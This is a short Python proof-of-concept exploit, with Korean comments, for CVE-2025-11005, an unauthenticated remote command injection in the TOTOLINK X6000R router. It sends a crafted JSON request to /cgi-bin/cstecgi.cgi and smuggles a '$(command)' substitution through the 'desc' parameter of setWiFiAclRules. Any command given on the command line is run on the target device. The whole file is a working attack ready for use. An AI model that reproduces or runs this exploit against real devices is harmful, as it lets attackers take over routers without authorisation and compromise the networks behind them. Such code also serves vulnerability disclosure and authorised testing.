#!/usr/bin/env python3
# Exploit for CVE-2025-11005: TOTOLINK X6000R Unauthenticated RCE
#
# 이 스크립트는 /cgi-bin/cstecgi.cgi 엔드포인트로 조작된 JSON 요청을 보내
# 'setWiFiAclRules' 함수의 'desc' 파라미터를 통해 원격 명령어를 주입합니다.
# 최종 성공 페이로드: $(command)

'''사용법
   # ex.py 파일에 실행 권한 부여
   chmod +x ex.py
   
   # 스크립트 실행
   ./ex.py <라우터_IP> '<실행할_명령어>'
'''

import requests
import argparse
import json

def exploit(target_ip, command):
    """
    취약점을 트리거하여 원격 명령어를 실행하는 함수
    """
    target_url = f"http://{target_ip}/cgi-bin/cstecgi.cgi"
    
    headers = {
        "Content-Type": "application/json;charset=UTF-8"
    }
    
    # 명령어 치환 $(...)을 이용한 페이로드
    payload = f"$({command})"
    
    # 실제 웹페이지의 요청과 유사하게 필수 파라미터를 포함한 JSON 데이터
    data = {
        "topicurl": "setWiFiAclRules",
        "mac": "AA:BB:CC:DD:EE:FF",
        "desc": payload,
        "addEffect": "1",
        "wifiIdx": "0"
    }
    
    print(f"[*] 타겟 URL: {target_url}")
    print(f"[*] 전송할 페이로드: {data['desc']}")
    
    try:
        response = requests.post(target_url, headers=headers, data=json.dumps(data), timeout=10)
        
        print(f"[*] 서버 응답 코드: {response.status_code}")
        # 성공 시 보통 빈 내용의 200 OK 응답이 옴
        if response.status_code == 200:
            print("[+] 공격 요청이 성공적으로 전송되었습니다.")
            print(f"[*] 라우터에 접속하여 '{command}' 명령어의 실행 결과를 확인하십시오.")
        else:
            print(f"[-] 공격 요청이 실패했습니다. 응답 내용: {response.text}")
            
    except requests.exceptions.RequestException as e:
        print(f"[-] 에러 발생: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-11005 - TOTOLINK X6000R Unauthenticated RCE PoC")
    parser.add_argument("target_ip", help="타겟 라우터의 IP 주소 (예: 192.168.1.1)")
    parser.add_argument("command", help="라우터에서 실행할 쉘 명령어 (예: 'id | tee /tmp/pwned.txt')")
    
    args = parser.parse_args()
    
    exploit(args.target_ip, args.command)
